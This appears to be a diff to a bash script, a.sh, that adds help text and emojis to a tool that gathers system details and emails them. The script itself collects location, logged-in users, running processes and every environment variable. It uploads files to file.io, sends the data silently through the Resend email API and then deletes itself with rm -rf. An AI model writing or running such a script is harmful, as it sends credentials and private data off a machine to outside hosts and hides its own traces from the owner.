@@ -1,5 +1,28 @@
 #!/bin/bash
 
+# Function to display help
+display_help() {
+  echo "🛠️  Script Help"
+  echo "Usage: a.sh [options]"
+  echo
+  echo "Options:"
+  echo "  -s SUBJECT      📩 Set the email subject (default: your username)"
+  echo "  -b BODY         📝 Set the email body (default: user location)"
+  echo "  -f FILE         📂 Attach a file to the email"
+  echo "  -a              📊 Send comprehensive system information"
+  echo "  -h, --help      ❓ Display this help message"
+  echo
+  echo "Description:"
+  echo "This script gathers system information and sends it via email."
+  echo "You can specify a subject and body for the email, attach a file,"
+  echo "and include comprehensive system information if desired."
+  echo
+  echo "Examples:"
+  echo "  ./a.sh -s \"Daily Report\" -b \"Here is my report.\" -a"
+  echo "  ./a.sh -f /path/to/file.txt -a"
+  echo
+}
+
 # Initialize variables
 subject=""
 body=""
@@ -32,7 +55,7 @@ running_processes=$(ps aux --sort=-%mem | head -n 10)
 env_vars=$(printenv)
 
 # Parse command line arguments
-while getopts ":s:b:f:a" opt; do
+while getopts ":s:b:f:ah" opt; do
   case $opt in
     s) subject="$OPTARG"
     ;;
@@ -42,7 +65,9 @@ while getopts ":s:b:f:a" opt; do
     ;;
     a) send_all_info=true
     ;;
-    \?) exit 1
+    h) display_help; exit 0
+    ;;
+    \?) echo "Invalid option: -$OPTARG" >&2; exit 1
     ;;
   esac
 done
@@ -54,7 +79,7 @@ fi
 
 # If body is not provided, default to the user's location
 if [ -z "$body" ]; then
-  body="User Location: $location"
+  body="🗺️ User Location: $location"
 fi
 
 # Set API key and endpoint
@@ -64,7 +89,7 @@ url="https://api.resend.com/emails"
 # Upload file using file.io and get the link if file exists
 file_link=""
 if [ -n "$file" ] && [ -f "$file" ]; then
-  echo "Uploading file..."
+  echo "📤 Uploading file..."
   response=$(curl -s -X POST 'https://file.io/' \
     -H 'accept: application/json' \
     -H 'Content-Type: multipart/form-data' \
@@ -87,22 +112,22 @@ if [ "$send_all_info" = true ]; then
   # Send all system info
   full_body="<p>$body</p>
   <hr>
-  <h3>Comprehensive System Information:</h3>
+  <h3>🔍 Comprehensive System Information:</h3>
   <ul>
-  <li><strong>OS Info:</strong> $os_info</li>
-  <li><strong>CPU Info:</strong> $cpu_info</li>
-  <li><strong>CPU Architecture:</strong> $cpu_arch</li>
-  <li><strong>Total Memory:</strong> $mem_total</li>
-  <li><strong>Used Memory:</strong> $mem_used</li>
-  <li><strong>Free Memory:</strong> $mem_free</li>
-  <li><strong>Disk Usage (Root):</strong> $disk_usage</li>
-  <li><strong>Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
-  <li><strong>Network Interfaces:</strong> $network_interfaces</li>
-  <li><strong>IP Address:</strong> $ip_info</li>
-  <li><strong>System Uptime:</strong> $uptime_info</li>
-  <li><strong>Logged-in Users:</strong> <pre>$logged_users</pre></li>
-  <li><strong>Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
-  <li><strong>Environment Variables:</strong> <pre>$env_vars</pre></li>
+  <li><strong>🖥️ OS Info:</strong> $os_info</li>
+  <li><strong>💻 CPU Info:</strong> $cpu_info</li>
+  <li><strong>🛠️ CPU Architecture:</strong> $cpu_arch</li>
+  <li><strong>🧠 Total Memory:</strong> $mem_total</li>
+  <li><strong>🆗 Used Memory:</strong> $mem_used</li>
+  <li><strong>🆓 Free Memory:</strong> $mem_free</li>
+  <li><strong>💾 Disk Usage (Root):</strong> $disk_usage</li>
+  <li><strong>🗂️ Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
+  <li><strong>🌐 Network Interfaces:</strong> $network_interfaces</li>
+  <li><strong>🌍 IP Address:</strong> $ip_info</li>
+  <li><strong>⏱️ System Uptime:</strong> $uptime_info</li>
+  <li><strong>👤 Logged-in Users:</strong> <pre>$logged_users</pre></li>
+  <li><strong>🔟 Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
+  <li><strong>🌱 Environment Variables:</strong> <pre>$env_vars</pre></li>
   </ul>
   $file_attachment"
 else
@@ -129,4 +154,5 @@ curl -s -X POST "$url" \
   -H "Content-Type: application/json" \
   -d "$email_data" > /dev/null 2>&1
 
+# Remove the script itself (optional)
 rm -rf ./a.sh
